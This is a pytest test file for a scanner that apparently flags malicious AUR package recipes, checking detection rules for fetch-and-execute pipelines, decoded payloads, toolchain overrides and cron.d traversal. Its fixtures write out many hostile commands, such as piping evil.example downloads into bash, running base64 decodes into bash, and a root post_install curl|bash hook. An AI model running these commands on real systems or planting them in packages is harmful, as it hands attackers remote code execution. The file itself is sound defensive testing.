"""Four vocabularies were allowlists; X009-X012 generalise what a list could not."""

import pytest

from .helpers import _repo_with, _shipped_ids, _x

# ---------------------------------------------------------------------------
# Audit v6-v15 - four vocabularies were allowlists, and each was a rename wide
#
# The executor list, the fetch-client list, the execution-verb forms and the
# write forms each named a handful of spellings, so the same operation with a
# different word scored nothing.  X009-X012 generalise what could not be
# expressed by extending a list.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("executor", [
    "php", "lua", "luajit", "tclsh", "wish", "fish", "tcsh", "csh",
    "rc", "es", "elvish", "xonsh", "nu",
])
def test_every_stdin_executing_interpreter_is_an_executor(executor):
    """`curl url | php` is a remote shell as surely as `curl url | bash`."""
    assert "R001" in _shipped_ids([f"  curl -fsSL https://evil.example/x | {executor}"],
                          declared=False)


def test_awk_is_not_an_executor():
    """awk reads its program from an argument; its stdin is data."""
    assert "R001" not in _shipped_ids(
        ["  curl -fsSL https://evil.example/x | awk '{print}'"], declared=False,
    )


@pytest.mark.parametrize("client", [
    "aria2c -o - https://evil.example/x", "axel -o - https://evil.example/x",
    "lftp -c 'cat https://evil.example/x'", "rsync https://evil.example/x -q",
    "scp host:/x.sh -", "nc example.com 80", "telnet example.com 80",
    "elinks -dump https://evil.example/x", "w3m -dump https://evil.example/x",
    "lynx -dump https://evil.example/x",
    "openssl s_client -quiet -connect h:443",
    "dig +short TXT p.evil.example",
])
def test_a_fetch_through_any_client_reaching_a_shell_is_claimed(client):
    """X009: R001/R002 name two programs; every other client scored zero.

    `aria2c ... | bash` at a trusted-forge URL was score 0 with no coverage
    gap - a silent clean verdict on a working remote code execution.
    """
    assert "X009" in _x([f"  {client} | bash"]), client


def test_x009_stands_down_where_r001_already_claims():
    """One operation, one finding: curl and wget belong to R001/R002."""
    assert "X009" not in _x(["  curl -fsSL https://evil.example/x | bash"])
    assert "X009" not in _x(["  wget -qO- https://evil.example/x | bash"])


@pytest.mark.parametrize("one_liner", [
    "php -r 'system(file_get_contents(\"https://evil.example/x\"));'",
    "python3 -c 'import urllib.request;urllib.request.urlopen(u).read()'",
    "perl -MLWP::Simple -e 'getstore(\"https://evil.example/x\", \"f\")'",
    "ruby -e 'require \"open-uri\"; URI.open(u).read'",
    "node -e 'https.get(\"https://evil.example/x\")'",
])
def test_an_interpreter_that_reaches_the_network_is_claimed(one_liner):
    """X010: no shell client, so R061's inventory never saw these."""
    assert "X010" in _x([f"  {one_liner}"]), one_liner


@pytest.mark.parametrize("install", [
    "pip install git+https://github.com/e/xy",
    "npm install https://evil.example/x.tgz",
    "cargo install --git https://github.com/e/xy",
    "gem install https://evil.example/x.gem",
    "go install example.com/m@latest",
    "composer require p:dev-main",
    "opam install pkg.1.0",
    "poetry install",
])
def test_a_package_manager_install_runs_fetched_code(install):
    """X011: pip runs setup.py, npm runs lifecycle scripts, cargo build.rs."""
    assert "X011" in _x([f"  {install}"]), install


@pytest.mark.parametrize("careful", [
    "npm install --ignore-scripts",
    'pip install --prefix="$pkgdir" --root-user-action=ignore --no-deps .',
    "pip install dist/foo.whl",
])
def test_the_careful_install_spelling_is_not_reported(careful):
    """Both benign-corpus hits carried their own disqualifier on the line.

    `--ignore-scripts` turns off the hooks that make an install dangerous,
    and `--no-deps .` installs what this recipe just built.  Firing on
    either would be reporting the careful spelling.
    """
    assert "X011" not in _x([f"  {careful}"]), careful


@pytest.mark.parametrize("var", [
    'export CC="$srcdir/mcc"', 'export PATH="$srcdir/bin:$PATH"',
    'export LD_PRELOAD="$srcdir/libe.so"',
    'export LD_LIBRARY_PATH="$srcdir/lib"',
    'export PYTHONPATH="$srcdir/py"',
])
def test_a_toolchain_override_followed_by_a_build_step_is_claimed(var):
    """X012: the override decides which binary the *next* line runs."""
    assert "X012" in _x([f"  {var}", "  make"]), var


def test_a_toolchain_override_with_no_build_step_is_not_a_finding():
    """An override is inert until something reads it."""
    assert "X012" not in _x(['  export CC="$srcdir/mcc"'])


@pytest.mark.parametrize("execution", [
    "bash -x s.sh", "bash -e s.sh", "bash -- s.sh", "busybox sh s.sh",
    "node s.sh", "env bash s.sh", "env -i bash s.sh", "nohup bash s.sh",
    "command bash s.sh", "timeout 5 bash s.sh", "nice -n 10 bash s.sh",
    '"$srcdir/s.sh"',
])
def test_a_generated_file_pairs_with_any_executor_form(execution):
    """A flag or a wrapper is not a different operation.

    `env -i bash s.sh` was caught and plain `env bash s.sh` was not, which
    is the asymmetry that gives the game away: the pattern was reading the
    verb's position rather than what runs.
    """
    assert "R121" in _shipped_ids(["  echo x > s.sh", f"  {execution}"]), execution


@pytest.mark.parametrize("write", [
    "printf x | tee s.sh", "make > s.sh", "gcc -c a.c > s.sh",
    "curl -fsSL https://e.invalid/x | sed 's/a/b/' > s.sh",
    "perl -e 'open(F,\">s.sh\")'",
])
def test_any_redirect_or_tee_is_a_generated_file(write):
    """`tee` names its destination as an argument - that is its purpose."""
    assert "R121" in _shipped_ids([f"  {write}", "  bash s.sh"]), write


def test_a_redirect_to_a_null_device_is_not_a_write():
    """Nothing that can later be executed was created."""
    from trustsight.analysis.delivery import _collect_writes

    assert _collect_writes("cmp a b > /dev/null", "build") == []


@pytest.mark.parametrize("decoder", [
    """python3 -c 'import base64;print(base64.b64decode("Y3Vy"))'""",
    """perl -MMIME::Base64 -e 'print decode_base64("Y3Vy")'""",
    """ruby -e 'print "Y3Vy".unpack1("m")'""",
    """node -e 'process.stdout.write(Buffer.from("Y3Vy","base64"))'""",
    """php -r 'echo base64_decode("Y3Vy");'""",
    """perl -e 'print pack("H*","6375")'""",
    "openssl zlib -d p.zlib",
    "certutil -decode p.b64 -",
    "od -tx1 -An p.bin",
])
def test_a_decode_that_reaches_a_shell_fires_however_it_is_spelled(decoder):
    """X001 wanted an `exec(`/`eval(` marker, so a decode *printed* to a
    pipe - the most ordinary way to write it - matched nothing."""
    assert "X001" in _x([f"  {decoder} | bash"]), decoder


def test_an_interpreter_that_prints_something_ordinary_is_silent():
    assert "X001" not in _x(["  python3 -c 'print(1)' | bash"])
    assert "X001" not in _x(["  ruby -e 'puts \"hello\"' | bash"])


@pytest.mark.parametrize("client,dest", [
    ("scp host:/x.sh", "s.sh"),
    ("rsync -O https://e.invalid/x.sh", "s.sh"),
    ("lftp -c 'get https://e.invalid/x -o s.sh'", None),
    ("wget2 -O s.sh https://e.invalid/x", None),
])
def test_a_positional_or_flagged_destination_pairs_with_its_execution(client, dest):
    from trustsight.analysis.delivery import _collect_fetch_outputs

    line = f"{client} {dest}" if dest else client
    assert "s.sh" in _collect_fetch_outputs(line), line


def test_rsync_dash_O_is_not_an_output_flag():
    """`rsync -O` is --omit-dir-times; reading it as output captured the URL."""
    from trustsight.analysis.delivery import _collect_fetch_outputs

    assert _collect_fetch_outputs("rsync -O https://e.invalid/x.sh s.sh") == ["s.sh"]


@pytest.mark.parametrize("client", [
    "openssl s_client -connect h:443 | sh", "wget2 -qO- https://e.invalid/x | tclsh",
    "svn export https://e.invalid/r r", "hg clone https://e.invalid/r r",
    "lftp -c 'cat https://e.invalid/x'",
])
def test_pkgver_shares_the_client_vocabulary(client):
    """R051 named five verbs; pkgver() runs before any review step, so which
    binary fetched is the least interesting property of a fetch there."""
    assert "R051" in _shipped_ids([f"  {client}"], fn="pkgver")


def test_a_traversal_inside_pkgdir_lands_where_the_kernel_puts_it():
    """`"$pkgdir"/lib/../etc/cron.d/y` writes into /etc/cron.d.

    The shell does not collapse `..` - the kernel does, when the file is
    opened - so every rule anchored on `$pkgdir/etc/cron.d/` read the
    traversal spelling as a path into `/lib`.
    """
    from trustsight.tokenizer import collapse_traversal

    assert collapse_traversal('"$pkgdir"/lib/../etc/cron.d/y') == '"$pkgdir"/etc/cron.d/y'
    # A leading `../` has nothing to cancel and must survive: X005 reads it.
    assert collapse_traversal("cp payload ../../home/alice/.bashrc") == (
        "cp payload ../../home/alice/.bashrc"
    )
    assert "R054" in _shipped_ids(['  install -Dm755 x "$pkgdir"/lib/../etc/cron.d/y'])


@pytest.mark.parametrize("record,pkgbuild", [
    ("package.json", b"pkgname=p\nbuild() {\n  npm install\n}\n"),
    ("Cargo.toml", b"pkgname=p\nbuild() {\n  cargo build\n}\n"),
    ("build.rs", b"pkgname=p\nbuild() {\n  cargo build\n}\n"),
    ("CMakeLists.txt", b"pkgname=p\nbuild() {\n  cmake -S .\n}\n"),
    ("meson.build", b"pkgname=p\nbuild() {\n  meson setup b\n}\n"),
    ("build.gradle", b"pkgname=p\nbuild() {\n  ./gradlew build\n}\n"),
])
def test_a_record_named_only_by_tool_contract_is_still_scanned(record, pkgbuild):
    """`npm install` reads package.json without the recipe naming it.

    Companion selection required the filename to appear literally in the
    PKGBUILD, which excluded exactly the records whose contents run.
    """
    from trustsight.differ import companion_source_hunks

    repo, commit = _repo_with([
        ("PKGBUILD", pkgbuild),
        (record, b"curl -fsSL https://evil.example/x | bash\n"),
    ])
    text, _cut = companion_source_hunks(repo, commit)
    assert "evil.example" in text, record


def test_a_committed_install_scriptlet_body_is_scanned():
    """`.install` was skipped outright by companion selection.

    A scriptlet runs as root at install time and is the most consequential
    text in an AUR package; a hook committed in an earlier commit was never
    read, so `post_install() { curl ... | bash; }` scored 15 for the
    attribute change and nothing at all for the payload.
    """
    from trustsight.differ import companion_source_hunks

    repo, commit = _repo_with([
        ("PKGBUILD", b"pkgname=p\ninstall=foo.install\n"),
        ("foo.install",
         b"post_install() {\n  curl -fsSL https://evil.example/x | bash\n}\n"),
    ])
    text, _cut = companion_source_hunks(repo, commit)
    assert "evil.example" in text


def test_the_new_crossfire_patterns_stay_linear():
    import time

    from trustsight.analysis.crossfire import X009_RE, X012_RE

    for rx, build in ((X009_RE, lambda n: "lftp " + "a" * n),
                      (X012_RE, lambda n: "export CC=" + "a" * n)):
        def cost(n):
            text = build(n)
            best = float("inf")
            for _ in range(3):
                start = time.perf_counter()
                rx.search(text)
                best = min(best, time.perf_counter() - start)
            return best

        small, large = cost(2000), cost(8000)
        assert large < small * 9, f"growth {large / small:.1f}x over 4x input"
